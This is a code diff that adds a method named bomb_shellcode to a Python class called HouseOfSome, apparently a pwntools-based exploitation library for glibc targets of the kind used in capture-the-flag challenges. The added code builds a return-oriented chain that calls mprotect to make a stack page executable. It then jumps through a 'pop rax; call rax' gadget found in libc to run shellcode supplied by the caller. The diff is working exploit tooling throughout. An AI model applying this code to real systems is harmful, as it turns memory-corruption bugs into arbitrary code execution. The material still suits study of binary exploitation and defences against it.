@@ -171,6 +171,39 @@ class HouseOfSome:
         assert b"\n" not in rop_chain, "\\n in rop_chain"
         io.sendline(rop_chain)
 
+    def bomb_shellcode(self, io: tube,  shellcode: bytes, pop_rax_call_rax: int=0, retn_addr: int=0, offset: int=0):
+        """
+        Usage:
+            bomb_shellcode(io, shellcode, pop_rax_call_rax, retn_addr, offset)
+
+        Arguments:
+            io: pwnlib tube
+            shellcode: shellcode
+            pop_rax_call_rax: gadget `pop rax; call rax` address, default use libc.search(asm('pop rax; call rax'))
+            retn_addr: _IO_flush_all address
+            offset: offset of _envion leaked address in stack
+        """
+
+        stack = self.bomb_raw(io, retn_addr, offset)
+        if pop_rax_call_rax == 0:
+            pop_rax_call_rax = next(self.libc.search(b'X\xff\xd0', executable=True))
+            log.success(f"Default pop_rax_call_rax found: {pop_rax_call_rax:#x}")
+
+        log.info(f"pop_rax_call_rax: {pop_rax_call_rax:#x}")
+    
+        rop = ROP(self.libc)
+        rop.base = stack
+        rop.call('mprotect', [stack & (~0xfff), 0x1000, 7])
+        log.info(rop.dump())
+        rop_chain = rop.chain()
+        assert b"\n" not in rop_chain, "\\n in rop_chain"
+        io.sendline(flat([
+            rop_chain,
+            pop_rax_call_rax,
+            stack + len(rop_chain) + 0x10,
+            shellcode,
+        ]))
+
     def bomb_raw(self, io: tube, retn_addr=0, offset=0):
         """
         Usage:
